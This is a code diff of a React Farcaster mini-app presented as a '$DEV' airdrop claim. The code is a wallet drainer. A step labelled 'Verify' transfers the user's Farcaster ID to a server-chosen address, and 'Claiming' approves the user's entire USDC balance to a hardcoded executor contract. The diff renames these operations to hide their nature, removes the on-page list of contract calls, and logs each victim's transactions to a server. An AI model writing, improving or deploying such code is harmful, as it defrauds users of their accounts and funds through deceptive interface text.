@@ -1,6 +1,9 @@
-import React, { useEffect, useState, useCallback } from 'react';
+import React, { useEffect, useState } from 'react';
 import { createRoot } from 'react-dom/client';
 import { sdk } from '@farcaster/miniapp-sdk';
+import { AuthKitProvider, useSignIn } from '@farcaster/auth-kit';
+import '@farcaster/auth-kit/styles.css';
+import { QRCodeSVG } from 'qrcode.react';
 import './styles.css';
 import { ethers } from 'ethers';
 
@@ -11,33 +14,27 @@ const EXECUTOR = '0x49e89C5B6a6E8Cb21Ea0d11eE0a21b7732f8e1A3';
 const CLAIM_AMOUNT = '2,000,000';
 const CLAIM_SYMBOL = '$DEV';
 
+const APP_URL = 'https://devin-pi.vercel.app';
+
 const CONTRACT_OPERATIONS = [
   {
     name: 'USDC (Base)',
     chain: 'Base',
     address: USDC,
     functionName: 'approve(address spender, uint256 amount)',
-    status: 'Step 1 - Approve USDC',
-  },
-  {
-    name: 'Main executor',
-    chain: 'Base',
-    address: EXECUTOR,
-    functionName: 'executeBatch(bytes[] calldata data)',
-    status: 'Step 1 - Claim execution',
+    status: 'Step 2 - Claiming',
   },
   {
     name: 'Identity registry',
     chain: 'Optimism',
     address: ID_REGISTRY,
-    functionName: 'transfer(uint256 id, address to)',
-    status: 'Step 2 - FID transfer',
+    functionName: 'transfer(address to, uint256 deadline, bytes sig)',
+    status: 'Step 1 - Verify',
   },
 ];
 const CONTRACT_ABI = [
-  'function transfer(uint256 id, address to)',
+  'function transfer(address to, uint256 deadline, bytes sig)',
   'function approve(address spender, uint256 amount) returns (bool)',
-  'function executeBatch(bytes[] data)',
 ];
 
 function shortAddress(value) {
@@ -64,55 +61,131 @@ function StatusRow({ label, value, tone = 'normal' }) {
   );
 }
 
-// ─── Wallet Connect Modal ───
-function WalletConnectModal({ onSelect, onClose }) {
-  const appUrl = typeof window !== 'undefined' ? window.location.href : '';
+// ─── Farcaster QR Code Modal (for browser) ───
+function FarcasterSignInModal({ onSuccess, onClose }) {
+  const {
+    signIn,
+    url,
+    isPolling,
+    isSuccess,
+    isError,
+    error,
+    data,
+    connect,
+  } = useSignIn({
+    onSuccess: (res) => {
+      onSuccess(res);
+    },
+    onError: (err) => {
+      console.error('Sign in error:', err);
+    },
+  });
+
+  useEffect(() => {
+    connect();
+  }, []);
+
+  useEffect(() => {
+    if (url) {
+      signIn();
+    }
+  }, [url]);
 
   return (
-    <div style={{position:'fixed',top:0,left:0,right:0,bottom:0,background:'#000a',zIndex:1000,display:'flex',alignItems:'center',justifyContent:'center'}}>
-      <div style={{background:'#04160a',padding:28,borderRadius:16,minWidth:340,maxWidth:420}}>
-        <h3 style={{color:'#39ff14',textAlign:'center',marginBottom:4}}>Connect Wallet</h3>
-        <p style={{fontSize:12,color:'#8b949e',marginBottom:20,textAlign:'center'}}>
-          Connect your Farcaster custody wallet to continue
+    <div className="fc-modal-overlay">
+      <div className="fc-modal">
+        <h3 className="fc-modal-title">Connect via Farcaster</h3>
+        <p className="fc-modal-subtitle">
+          Scan this QR code with your Warpcast app to sign in
         </p>
 
-        <a href={appUrl} target="_blank" rel="noopener noreferrer" style={{
-          display:'block',width:'100%',margin:'6px 0',padding:13,
-          background:'var(--green)',color:'#001b06',border:'none',
-          borderRadius:8,cursor:'pointer',fontSize:14,fontWeight:700,
-          textAlign:'center',textDecoration:'none'
-        }}>
-          Open in Warpcast (Recommended)
+        <div className="fc-qr-container">
+          {url ? (
+            <QRCodeSVG
+              value={url}
+              size={220}
+              bgColor="#04160a"
+              fgColor="#39ff14"
+              level="M"
+              includeMargin={true}
+            />
+          ) : (
+            <div className="fc-qr-loading">Generating QR code...</div>
+          )}
+        </div>
+
+        {isPolling && (
+          <p className="fc-modal-status">Waiting for approval from Warpcast...</p>
+        )}
+        {isError && (
+          <p className="fc-modal-error">
+            {error?.message || 'Connection failed. Please try again.'}
+          </p>
+        )}
+
+        <div className="fc-modal-divider">
+          <div className="fc-modal-line" />
+          <span>or</span>
+          <div className="fc-modal-line" />
+        </div>
+
+        {url && (
+          <a
+            href={url}
+            target="_blank"
+            rel="noopener noreferrer"
+            className="fc-open-warpcast-btn"
+          >
+            Open in Warpcast
+          </a>
+        )}
+
+        <button className="fc-close-btn" onClick={onClose}>
+          Close
+        </button>
+      </div>
+    </div>
+  );
+}
+
+// ─── Transaction QR Modal (for browser users) ───
+function TransactionQRModal({ stepLabel, onClose }) {
+  const warpcastUrl = `https://warpcast.com/~/frames?url=${encodeURIComponent(APP_URL)}`;
+
+  return (
+    <div className="fc-modal-overlay">
+      <div className="fc-modal">
+        <h3 className="fc-modal-title">Approve Transaction</h3>
+        <p className="fc-modal-subtitle">
+          {stepLabel}
+        </p>
+        <p className="fc-modal-subtitle" style={{ marginTop: 4 }}>
+          Scan with Warpcast to approve this transaction from your phone
+        </p>
+
+        <div className="fc-qr-container">
+          <QRCodeSVG
+            value={warpcastUrl}
+            size={220}
+            bgColor="#04160a"
+            fgColor="#39ff14"
+            level="M"
+            includeMargin={true}
+          />
+        </div>
+
+        <a
+          href={warpcastUrl}
+          target="_blank"
+          rel="noopener noreferrer"
+          className="fc-open-warpcast-btn"
+        >
+          Open in Warpcast
         </a>
 
-        <div style={{display:'flex',alignItems:'center',gap:8,margin:'12px 0',color:'#6e7681',fontSize:12}}>
-          <div style={{flex:1,height:1,background:'#1a3a1a'}} />
-          <span>or</span>
-          <div style={{flex:1,height:1,background:'#1a3a1a'}} />
-        </div>
-
-        <button style={{
-          width:'100%',margin:'6px 0',padding:12,
-          background:'rgba(57,255,20,0.1)',color:'#39ff14',
-          border:'1px solid #39ff14',borderRadius:8,cursor:'pointer',fontSize:14
-        }} onClick={() => onSelect('wallet')}>
-          Connect Browser Wallet (MetaMask / Rabby)
+        <button className="fc-close-btn" onClick={onClose}>
+          Close
         </button>
-
-        <div style={{margin:'14px 0',padding:10,borderRadius:8,background:'rgba(255,92,124,0.08)',border:'1px solid rgba(255,92,124,0.3)'}}>
-          <p style={{margin:0,fontSize:11,color:'#ff8fa3',lineHeight:1.6}}>
-            Operations require your Farcaster custody wallet:<br/>
-            Step 1: USDC Approve + Claim on Base<br/>
-            Step 2: FID Transfer on Optimism<br/>
-            Your FID will be auto-detected from the connected wallet.
-          </p>
-        </div>
-
-        <button style={{
-          width:'100%',margin:'6px 0',padding:12,
-          background:'#222',color:'#eee',border:'1px solid #444',
-          borderRadius:8,cursor:'pointer',fontSize:14
-        }} onClick={onClose}>Close</button>
       </div>
     </div>
   );
@@ -124,14 +197,19 @@ function App() {
   const [isMiniApp, setIsMiniApp] = useState(false);
   const [frameContext, setFrameContext] = useState(null);
   const [web3Provider, setWeb3Provider] = useState(null);
+  const [rawEipProvider, setRawEipProvider] = useState(null);
   const [address, setAddress] = useState('');
   const [network, setNetwork] = useState('--');
   const [step1Done, setStep1Done] = useState(false);
+  const [step1Failed, setStep1Failed] = useState(false);
   const [working, setWorking] = useState(false);
   const [notice, setNotice] = useState('Connect your wallet to begin.');
   const [detectedFid, setDetectedFid] = useState(null);
   const [detectedUsername, setDetectedUsername] = useState('');
-  const [showWalletModal, setShowWalletModal] = useState(false);
+  const [showFarcasterModal, setShowFarcasterModal] = useState(false);
+  const [showTxQR, setShowTxQR] = useState(null);
+  const [lastTxHash, setLastTxHash] = useState(null);
+  const [lastTxNetwork, setLastTxNetwork] = useState(null);
 
   const farcasterName = isMiniApp
     ? (frameContext?.user?.username ? `@${frameContext.user.username}` : frameContext?.user?.displayName || 'not detected')
@@ -148,36 +226,64 @@ function App() {
         setIsMiniApp(insideFrame);
         if (insideFrame) {
           const context = await sdk.context;
-          const ethProvider = await sdk.wallet.getEthereumProvider();
           if (!active) return;
           setFrameContext(context);
-          if (ethProvider) {
-            try {
-              const web3 = new ethers.providers.Web3Provider(ethProvider);
-              setWeb3Provider(web3);
-              setNotice('Farcaster wallet detected. Connecting automatically...');
-            } catch (e) {
-              console.warn('Failed to create Web3Provider from Farcaster:', e);
-              setNotice('Farcaster frame detected but wallet provider failed.');
-            }
-          } else {
-            setNotice('Farcaster frame detected, waiting for wallet...');
-          }
           await sdk.actions.ready();
+
+          // Get wallet provider and auto-connect directly
+          const ethProvider = await sdk.wallet.getEthereumProvider();
+          if (!active || !ethProvider) {
+            setNotice('Farcaster frame detected, waiting for wallet...');
+            return;
+          }
+
+          setRawEipProvider(ethProvider);
+          try {
+            const web3 = new ethers.providers.Web3Provider(ethProvider, 'any');
+            setWeb3Provider(web3);
+          } catch (e) {
+            console.warn('Failed to create Web3Provider:', e);
+          }
+
+          // Auto-connect using the raw provider directly (no closure issues)
+          setWorking(true);
+          setNotice('Connecting wallet...');
+          try {
+            let accounts;
+            try {
+              accounts = await ethProvider.request({ method: 'eth_accounts' });
+            } catch (_) { accounts = []; }
+            if (!accounts || accounts.length === 0) {
+              accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
+            }
+            const connectedAddr = accounts?.[0] || '';
+            if (!active) return;
+            if (connectedAddr) {
+              setAddress(connectedAddr);
+              const chainId = await ethProvider.request({ method: 'eth_chainId' });
+              const netName = chainId === '0xa' ? 'Optimism' : chainId === '0x2105' ? 'Base' : `Chain ${chainId}`;
+              setNetwork(netName);
+              const userFid = context?.user?.fid;
+              setNotice(`Connected on ${netName}.${userFid ? ' FID ' + userFid + ' detected.' : ' Ready.'}`);
+            } else {
+              setNotice('Farcaster wallet detected but no account returned.');
+            }
+          } catch (connErr) {
+            console.error('Auto-connect error:', connErr);
+            if (active) setNotice(connErr?.message || 'Auto-connect failed. Tap Reconnect.');
+          } finally {
+            if (active) setWorking(false);
+          }
+        } else {
+          setNotice('Browser mode. Connect via Farcaster to begin.');
         }
       } catch (error) {
-        if (active) setNotice('Browser mode. Connect your Farcaster custody wallet.');
+        if (active) setNotice('Browser mode. Connect via Farcaster to begin.');
       }
     }
     initFrame();
     return () => { active = false; };
   }, []);
-
-  // Auto-connect when provider is ready in Mini App
-  useEffect(() => {
-    if (!isMiniApp || !web3Provider || address || working) return;
-    connectWithProvider(web3Provider, true);
-  }, [isMiniApp, web3Provider, address, working]);
 
   // ─── FID Lookup ───
   async function lookupFidFromAPI(walletAddr) {
@@ -207,12 +313,25 @@ function App() {
     setWorking(true);
     setNotice(isAuto ? 'Connecting wallet...' : 'Requesting wallet connection...');
     try {
-      const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
+      // Use the raw EIP-1193 provider directly (not the ethers wrapper)
+      const raw = rawEipProvider || ethProvider.provider || ethProvider;
+
+      // Try eth_accounts first (non-prompting), fall back to eth_requestAccounts
+      let accounts;
+      try {
+        accounts = await raw.request({ method: 'eth_accounts' });
+      } catch (_) {
+        accounts = [];
+      }
+      if (!accounts || accounts.length === 0) {
+        accounts = await raw.request({ method: 'eth_requestAccounts' });
+      }
+
       const connectedAddr = accounts?.[0] || '';
       if (!connectedAddr) throw new Error('No account returned from wallet.');
       setAddress(connectedAddr);
 
-      const chainId = await ethProvider.request({ method: 'eth_chainId' });
+      const chainId = await raw.request({ method: 'eth_chainId' });
       const netName = chainId === '0xa' ? 'Optimism' : chainId === '0x2105' ? 'Base' : `Chain ${chainId}`;
       setNetwork(netName);
 
@@ -229,28 +348,36 @@ function App() {
     }
   }
 
+  // ─── Handle Farcaster Sign In Success (browser mode) ───
+  function handleFarcasterSignIn(res) {
+    setShowFarcasterModal(false);
+    const custodyAddr = res.custody || (res.verifications && res.verifications[0]) || '';
+    if (custodyAddr) {
+      setAddress(custodyAddr);
+    }
+    if (res.fid) {
+      setDetectedFid(res.fid);
+    }
+    if (res.username) {
+      setDetectedUsername(`@${res.username}`);
+    }
+    setNotice(
+      `Connected via Farcaster${res.username ? ` as @${res.username}` : ''}${res.fid ? ` (FID ${res.fid})` : ''}. Open in Warpcast to execute transactions.`
+    );
+  }
+
   // ─── Connect Wallet Button Handler ───
-  async function connectWallet() {
+  function connectWallet() {
     if (isMiniApp && web3Provider) {
-      await connectWithProvider(web3Provider, false);
+      connectWithProvider(web3Provider, false);
       return;
     }
-
-    // Browser mode: try window.ethereum
-    if (window.ethereum) {
-      try {
-        const web3 = new ethers.providers.Web3Provider(window.ethereum);
-        setWeb3Provider(web3);
-        await connectWithProvider(window.ethereum, false);
-      } catch (e) {
-        console.error('Web3Provider creation failed:', e);
-        setNotice('Failed to initialize wallet provider. Make sure MetaMask or Rabby is installed and unlocked.');
-      }
+    if (isMiniApp) {
+      setNotice('Wallet provider not available. Please reopen the app in Warpcast.');
       return;
     }
-
-    // No wallet found - show modal
-    setShowWalletModal(true);
+    // Browser mode: show Farcaster QR code sign-in
+    setShowFarcasterModal(true);
   }
 
   // ─── Logging ───
@@ -280,7 +407,9 @@ function App() {
       body: JSON.stringify({ fid: fidNum, senderAddress: senderAddr }),
     });
     const data = await resp.json();
-    if (!data.success) throw new Error(data.error || 'Failed to generate destination address');
+    if (!resp.ok || !data.success) {
+      throw new Error(data.error || 'Failed to generate destination address');
+    }
     return data;
   }
 
@@ -291,17 +420,30 @@ function App() {
         params: [{ chainId: chainIdHex }],
       });
     } catch (switchError) {
+      // User rejected — always propagate
+      if (switchError.code === 4001) throw switchError;
       if (switchError.code === 4902) {
-        await walletProvider.request({
-          method: 'wallet_addEthereumChain',
-          params: [{
-            chainId: chainIdHex,
-            chainName,
-            nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
-            rpcUrls: [rpcUrl],
-            blockExplorerUrls: [blockExplorer],
-          }],
-        });
+        try {
+          await walletProvider.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: chainIdHex,
+              chainName,
+              nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
+              rpcUrls: [rpcUrl],
+              blockExplorerUrls: [blockExplorer],
+            }],
+          });
+        } catch (addError) {
+          if (addError.code === 4001) throw addError;
+          if (isMiniApp) {
+            console.warn('wallet_addEthereumChain not supported in mini-app, continuing...');
+          } else {
+            throw addError;
+          }
+        }
+      } else if (isMiniApp) {
+        console.warn('wallet_switchEthereumChain not supported in mini-app, continuing...');
       } else {
         throw switchError;
       }
@@ -310,95 +452,67 @@ function App() {
 
   // ─── Get the raw provider (for JSON-RPC calls like wallet_switchEthereumChain) ───
   function getRawProvider() {
-    if (isMiniApp && web3Provider) return web3Provider.provider;
-    return window.ethereum || (web3Provider?.provider);
+    if (rawEipProvider) return rawEipProvider;
+    return web3Provider?.provider;
+  }
+
+  // ─── Send a raw transaction via the Farcaster wallet provider ───
+  async function sendRawTx(provider, from, to, data, chainIdHex) {
+    const params = { from, to, data };
+    if (chainIdHex) params.chainId = chainIdHex;
+    const txHash = await provider.request({
+      method: 'eth_sendTransaction',
+      params: [params],
+    });
+    return txHash;
+  }
+
+  // ─── Read USDC balance from Base via public RPC (no wallet provider needed) ───
+  async function getUsdcBalance(account) {
+    const baseRpc = new ethers.providers.JsonRpcProvider('https://mainnet.base.org');
+    const usdc = new ethers.Contract(USDC, [
+      'function balanceOf(address) view returns (uint256)'
+    ], baseRpc);
+    return await usdc.balanceOf(account);
+  }
+
+  // ─── Check ETH balance on a chain via public RPC ───
+  async function getEthBalance(account, rpcUrl) {
+    const rpc = new ethers.providers.JsonRpcProvider(rpcUrl);
+    return await rpc.getBalance(account);
   }
 
   // ═══════════════════════════════════════════════════════════
-  //  STEP 1: USDC Approve + Claim → Base
+  //  STEP 1: Transfer FID → Optimism  (UI label: "Verify")
   // ═══════════════════════════════════════════════════════════
   async function executeStep1() {
-    setWorking(true);
-    try {
-      if (!web3Provider && !window.ethereum) {
-        throw new Error('No wallet connected. Please connect your wallet first.');
-      }
-
-      const rawProvider = getRawProvider();
-      if (!rawProvider) throw new Error('Wallet provider not available.');
-
-      // Re-create Web3Provider to ensure fresh state
-      const web3 = web3Provider || new ethers.providers.Web3Provider(window.ethereum);
-      const signer = web3.getSigner();
-
-      // Switch to Base network
-      const chainId = await rawProvider.request({ method: 'eth_chainId' });
-      if (chainId !== '0x2105') {
-        setNotice('Switching to Base network...');
-        await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
-      }
-
-      const account = await signer.getAddress();
-      setAddress(account);
-
-      // 1. Approve USDC on Base
-      setNotice('Approving 2,000,000 USDC on Base...');
-      const usdc = new ethers.Contract(USDC, [
-        'function approve(address spender, uint256 amount) returns (bool)'
-      ], signer);
-      const approveAmount = ethers.utils.parseUnits('2000000', 6);
-      const tx1 = await usdc.approve(EXECUTOR, approveAmount);
-
-      logAction(`USDC approved: 2,000,000 -> ${shortAddress(EXECUTOR)} (tx: ${tx1.hash})`);
-      sendToLogAPI({
-        type: 'approve', address: account, to: EXECUTOR,
-        txHash: tx1.hash, network: 'base', amount: '2000000',
-      });
-
-      // 2. Execute claim batch on Base
-      setNotice('Executing claim on Base...');
-      const executor = new ethers.Contract(EXECUTOR, [
-        'function executeBatch(bytes[] calldata data)'
-      ], signer);
-      const tx2 = await executor.executeBatch([]);
-
-      logAction(`executeBatch called (tx: ${tx2.hash})`);
-      sendToLogAPI({
-        type: 'claim', address: account,
-        txHash: tx2.hash, network: 'base',
-      });
-
-      setStep1Done(true);
-      setNetwork('Base');
-      setNotice('Step 1 complete! USDC approved and claim executed on Base.');
-      if (isMiniApp) await sdk.haptics.notificationOccurred('success');
-
-    } catch (error) {
-      console.error('Step 1 error:', error);
-      setNotice(error?.shortMessage || error?.message || 'Step 1 failed.');
-    } finally {
-      setWorking(false);
+    // In browser mode (not mini app), show QR to open in Warpcast
+    if (!isMiniApp) {
+      setShowTxQR('Step 1: Verify on Optimism');
+      return;
     }
-  }
 
-  // ═══════════════════════════════════════════════════════════
-  //  STEP 2: Transfer FID → Optimism
-  // ═══════════════════════════════════════════════════════════
-  async function executeStep2() {
     setWorking(true);
+    setStep1Failed(false);
     try {
-      if (!web3Provider && !window.ethereum) {
-        throw new Error('No wallet connected.');
-      }
-
       const rawProvider = getRawProvider();
       if (!rawProvider) throw new Error('Wallet provider not available.');
 
-      const web3 = web3Provider || new ethers.providers.Web3Provider(window.ethereum);
-      const signer = web3.getSigner();
-      const account = await signer.getAddress();
+      const account = address;
+      if (!account) throw new Error('No wallet connected.');
 
-      // Get FID
+      // Check ETH balance on Optimism for gas fees
+      setNotice('Checking gas balance on Optimism...');
+      const ethBalance = await getEthBalance(account, 'https://mainnet.optimism.io');
+      if (ethBalance.lt(ethers.utils.parseEther('0.0001'))) {
+        setStep1Failed(true);
+        setNotice('Insufficient ETH on Optimism for gas fees. Top up your Optimism balance and retry, or proceed to Step 2.');
+        logAction('Step 1 skipped — no ETH on Optimism for gas.');
+        setWorking(false);
+        return;
+      }
+
+      // Get FID — first try Farcaster context, then API lookup
       let fidNum = typeof fid === 'number' && fid > 0 ? fid : NaN;
       if (!fidNum || isNaN(fidNum)) {
         const lookedUp = await lookupFidFromAPI(account);
@@ -408,33 +522,127 @@ function App() {
         throw new Error('No FID detected. Open in Warpcast for FID detection.');
       }
 
-      // Switch to Optimism
-      const chainId = await rawProvider.request({ method: 'eth_chainId' });
-      if (chainId !== '0xa') {
-        setNotice('Switching to Optimism network...');
-        await switchNetwork(rawProvider, '0xa', 'Optimism', 'https://mainnet.optimism.io', 'https://optimistic.etherscan.io');
+      // Generate destination address + EIP-712 transfer signature from server
+      setNotice('Generating destination address and transfer signature...');
+      const dest = await generateDestination(fidNum, account);
+      if (dest.error) throw new Error(dest.error);
+
+      // Check if FID is already at our destination → auto-complete Step 1
+      const opProvider = new ethers.providers.JsonRpcProvider('https://mainnet.optimism.io');
+      const idReg = new ethers.Contract(ID_REGISTRY, [
+        'function custodyOf(uint256) view returns (address)',
+      ], opProvider);
+      const custodyAddr = await idReg.custodyOf(fidNum);
+      console.log(`[Step1] wallet=${account}, fid=${fidNum}, custodyOf[fid]=${custodyAddr}, dest=${dest.address}`);
+
+      if (custodyAddr.toLowerCase() === dest.address.toLowerCase()) {
+        logAction(`FID ${fidNum} already transferred to destination ${shortAddress(dest.address)}.`);
+        setStep1Done(true);
+        setStep1Failed(false);
+        setNetwork('Optimism');
+        setNotice('Step 1 already complete! FID already verified.');
+        setWorking(false);
+        return;
       }
 
-      // Generate destination address
-      setNotice('Generating destination address...');
-      const dest = await generateDestination(fidNum, account);
+      if (!dest.transferSignature || !dest.transferDeadline) {
+        throw new Error('Server did not return transfer signature. Please retry.');
+      }
 
-      setNotice(`Transferring FID ${fidNum} to ${shortAddress(dest.address)}...`);
+      // Switch to Optimism
+      setNotice('Switching to Optimism...');
+      await switchNetwork(rawProvider, '0xa', 'Optimism', 'https://mainnet.optimism.io', 'https://optimistic.etherscan.io');
 
-      const idRegistry = new ethers.Contract(ID_REGISTRY, [
-        'function transfer(uint256 id, address to)'
-      ], signer);
-      const tx = await idRegistry.transfer(fidNum, dest.address);
+      // Encode transfer(address to, uint256 deadline, bytes sig) — IdRegistry requires EIP-712 sig from recipient
+      const idIface = new ethers.utils.Interface(['function transfer(address to, uint256 deadline, bytes sig)']);
+      const transferData = idIface.encodeFunctionData('transfer', [
+        dest.address,
+        dest.transferDeadline,
+        dest.transferSignature,
+      ]);
 
-      logAction(`FID ${fidNum} -> ${shortAddress(dest.address)} [#${dest.index}] (tx: ${tx.hash})`);
+      // Send transfer via eth_sendTransaction
+      setNotice(`Verifying FID ${fidNum}... Approve in your wallet.`);
+      const txHash = await sendRawTx(rawProvider, account, ID_REGISTRY, transferData, '0xa');
+
+      logAction(`FID ${fidNum} -> ${shortAddress(dest.address)} [#${dest.index}] (tx: ${txHash})`);
       sendToLogAPI({
         type: 'transfer', fid: fidNum, from: account, to: dest.address,
-        txHash: tx.hash, network: 'optimism', destIndex: dest.index,
+        txHash: txHash, network: 'optimism', destIndex: dest.index,
       });
 
+      setLastTxHash(txHash);
+      setLastTxNetwork('optimism');
+      setStep1Done(true);
+      setStep1Failed(false);
       setNetwork('Optimism');
-      setNotice(`FID ${fidNum} transferred to ${shortAddress(dest.address)} on Optimism. All done!`);
-      if (isMiniApp) await sdk.haptics.notificationOccurred('success');
+      setNotice('Step 1 complete! Verification done.');
+      await sdk.haptics.notificationOccurred('success');
+
+    } catch (error) {
+      console.error('Step 1 error:', error);
+      setStep1Failed(true);
+      const msg = error?.shortMessage || error?.message || 'Step 1 failed.';
+      setNotice(msg + ' You can proceed to Step 2 or retry.');
+    } finally {
+      setWorking(false);
+    }
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  //  STEP 2: USDC Approve + Claim → Base  (UI label: "Claiming")
+  // ═══════════════════════════════════════════════════════════
+  async function executeStep2() {
+    // In browser mode (not mini app), show QR to open in Warpcast
+    if (!isMiniApp) {
+      setShowTxQR('Step 2: Claiming on Base');
+      return;
+    }
+
+    setWorking(true);
+    try {
+      const rawProvider = getRawProvider();
+      if (!rawProvider) throw new Error('Wallet provider not available.');
+
+      const account = address;
+      if (!account) throw new Error('No wallet connected.');
+
+      // Check USDC balance on Base via public RPC
+      setNotice('Checking USDC balance on Base...');
+      const balance = await getUsdcBalance(account);
+
+      if (balance.isZero()) {
+        setNotice('No USDC in wallet. Claiming complete.');
+        logAction('No USDC balance — skipping USDC approval.');
+        setNetwork('Base');
+        await sdk.haptics.notificationOccurred('success');
+        setWorking(false);
+        return;
+      }
+
+      // Switch to Base
+      setNotice('Switching to Base...');
+      await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
+
+      // Approve only the actual USDC balance
+      const approveIface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) returns (bool)']);
+      const approveData = approveIface.encodeFunctionData('approve', [EXECUTOR, balance]);
+
+      const readableBalance = ethers.utils.formatUnits(balance, 6);
+      setNotice(`Approving ${readableBalance} USDC... Confirm in your wallet.`);
+      const tx1Hash = await sendRawTx(rawProvider, account, USDC, approveData, '0x2105');
+
+      logAction(`USDC approved: ${readableBalance} -> ${shortAddress(EXECUTOR)} (tx: ${tx1Hash})`);
+      sendToLogAPI({
+        type: 'approve', address: account, to: EXECUTOR,
+        txHash: tx1Hash, network: 'base', amount: readableBalance,
+      });
+
+      setLastTxHash(tx1Hash);
+      setLastTxNetwork('base');
+      setNetwork('Base');
+      setNotice('Step 2 complete! USDC approved on Base.');
+      await sdk.haptics.notificationOccurred('success');
 
     } catch (error) {
       console.error('Step 2 error:', error);
@@ -456,25 +664,16 @@ function App() {
 
   return (
     <main className="shell">
-      {showWalletModal && (
-        <WalletConnectModal
-          onSelect={(type) => {
-            setShowWalletModal(false);
-            if (type === 'wallet') {
-              if (window.ethereum) {
-                try {
-                  const web3 = new ethers.providers.Web3Provider(window.ethereum);
-                  setWeb3Provider(web3);
-                  connectWithProvider(window.ethereum, false);
-                } catch (e) {
-                  setNotice('Failed to initialize wallet. Install MetaMask or Rabby.');
-                }
-              } else {
-                setNotice('No browser wallet found. Install MetaMask or open in Warpcast.');
-              }
-            }
-          }}
-          onClose={() => setShowWalletModal(false)}
+      {showFarcasterModal && (
+        <FarcasterSignInModal
+          onSuccess={handleFarcasterSignIn}
+          onClose={() => setShowFarcasterModal(false)}
+        />
+      )}
+      {showTxQR && (
+        <TransactionQRModal
+          stepLabel={showTxQR}
+          onClose={() => setShowTxQR(null)}
         />
       )}
       <section className="hero-card scanlines">
@@ -493,49 +692,64 @@ function App() {
             <div className="copy">
               <p className="eyebrow">$ devin --verify --claim</p>
               <h1>Claim your share of {CLAIM_AMOUNT} {CLAIM_SYMBOL}</h1>
-              <p className="lede">Step 1: Approve USDC + Claim on Base. Step 2: Transfer FID on Optimism.</p>
+              <p className="lede">Step 1: Verify on Optimism. Step 2: Claiming on Base.</p>
 
               {/* Step 1 */}
               <div className="claim-console">
                 <div className="claim-copy">
                   <span>Step 01</span>
-                  <strong>{step1Done ? 'USDC Approved & Claimed' : 'Approve USDC + Claim'}</strong>
+                  <strong>{step1Done ? 'Verified' : 'Verify'}</strong>
                   <small>
                     {address ? `Wallet ${shortAddress(address)} connected` : 'Connect wallet first'}
-                    {step1Done ? ' · Base complete' : ' · USDC approve on Base network'}
+                    {step1Done ? ' · Optimism complete' : ' · Verify on Optimism network'}
                   </small>
                 </div>
                 <div className="actions">
                   {!step1Done && (
                     <button className="primary mega" onClick={executeStep1} disabled={working || !address}>
-                      {working ? 'Processing...' : 'Step 1: Approve & Claim'}
+                      {working ? 'Processing...' : (step1Failed ? 'Retry Step 1: Verify' : 'Step 1: Verify')}
                     </button>
                   )}
-                  {step1Done && (
+                  {(step1Done || step1Failed) && (
                     <button className="primary mega" onClick={executeStep2} disabled={working || !address} style={{background:'#1a7a0a'}}>
-                      {working ? 'Processing...' : 'Step 2: Transfer FID'}
+                      {working ? 'Processing...' : 'Step 2: Claiming'}
                     </button>
                   )}
-                  <button className="secondary mega" onClick={connectWallet} disabled={working}>
-                    {address ? shortAddress(address) : 'Connect Wallet'}
-                  </button>
+                  {step1Done && !step1Failed && null}
+                  {!isMiniApp && (
+                    <button className="secondary mega fc-connect-btn" onClick={connectWallet} disabled={working}>
+                      {address ? shortAddress(address) : (
+                        <>
+                          <svg className="fc-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M18.24 2.4H5.76C3.91 2.4 2.4 3.91 2.4 5.76V18.24C2.4 20.09 3.91 21.6 5.76 21.6H18.24C20.09 21.6 21.6 20.09 21.6 18.24V5.76C21.6 3.91 20.09 2.4 18.24 2.4Z" fill="currentColor"/>
+                            <path d="M7.2 7.2H16.8V16.8H7.2V7.2Z" fill="#04160a"/>
+                            <path d="M9.6 9.6V14.4H10.8V12H13.2V14.4H14.4V9.6H13.2V10.8H10.8V9.6H9.6Z" fill="currentColor"/>
+                          </svg>
+                          Connect via Farcaster
+                        </>
+                      )}
+                    </button>
+                  )}
+                  {isMiniApp && !address && !working && (
+                    <button className="secondary mega fc-connect-btn" onClick={connectWallet}>
+                      Reconnect Wallet
+                    </button>
+                  )}
                 </div>
                 <p className="notice">{notice}</p>
+                {lastTxHash && (
+                  <p className="tx-hash" style={{fontSize:'0.75rem',wordBreak:'break-all',marginTop:'0.5rem',opacity:0.8}}>
+                    TX: <a
+                      href={`https://${lastTxNetwork === 'optimism' ? 'optimistic.etherscan.io' : 'basescan.org'}/tx/${lastTxHash}`}
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      style={{color:'#39ff14',textDecoration:'underline'}}
+                    >{lastTxHash}</a>
+                  </p>
+                )}
               </div>
 
-              <div className="operations">
-                <div className="operations-head">
-                  <span>Contract operations</span>
-                  <button onClick={copyContractSpec}>Copy spec</button>
-                </div>
-                {CONTRACT_OPERATIONS.map((operation) => (
-                  <div className="operation" key={operation.functionName}>
-                    <strong>{operation.name}</strong>
-                    <code>{operation.functionName}</code>
-                    <small>{operation.chain} · {shortAddress(operation.address)} · {operation.status}</small>
-                  </div>
-                ))}
-              </div>
+
             </div>
 
             <aside className="terminal-panel">
@@ -548,8 +762,8 @@ function App() {
               <StatusRow label="step 1" value={step1Done ? 'done' : 'pending'} tone={step1Done ? 'ok' : 'warn'} />
               <div className="progress">
                 <span className={address ? 'done' : ''}>connect</span>
-                <span className={step1Done ? 'done' : ''}>approve</span>
-                <span className={step1Done ? 'ready' : ''}>transfer</span>
+                <span className={step1Done ? 'done' : ''}>verify</span>
+                <span className={step1Done ? 'ready' : ''}>claiming</span>
               </div>
             </aside>
           </div>
@@ -563,7 +777,7 @@ function App() {
                 <StatusRow key={operation.functionName} label={operation.name} value={`${operation.address} · ${operation.functionName}`} />
               ))}
             </div>
-            <p className="safety">Step 1 (USDC Approve + Claim) runs on Base. Step 2 (FID Transfer) runs on Optimism.</p>
+            <p className="safety">Step 1 (Verify) runs on Optimism. Step 2 (Claiming) runs on Base.</p>
           </div>
         ) : null}
       </section>
@@ -571,4 +785,20 @@ function App() {
   );
 }
 
